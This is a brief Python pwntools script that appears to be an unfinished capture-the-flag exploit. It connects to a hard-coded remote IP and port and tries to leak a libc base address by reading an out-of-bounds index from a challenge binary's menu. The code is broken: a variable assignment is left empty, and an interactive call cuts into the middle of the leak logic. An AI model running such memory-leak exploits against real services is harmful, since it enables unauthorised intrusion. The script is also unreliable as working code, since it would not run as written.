from pwn import *

elf = ELF('./chall')
libc = ELF('./libc-2.27.so')
r = remote('69.172.229.147', 9001 )

def show( idx ):
    r.sendlineafter('> ', '2' )
    r.sendlineafter('index: ', str( idx ) )
    r.recvuntil('data: ')
    return r.recvline()[:-1]

# send N
N = 0xffff
r.sendlineafter('n: ', str( N ) )

r.interactive()
# get libc addr
free_mem = 
libc_base = int.from_bytes(show( N-3 ), 'little' ) - 20 
print( 'libc_base: ' + hex(libc_base ) )


r.interactive()
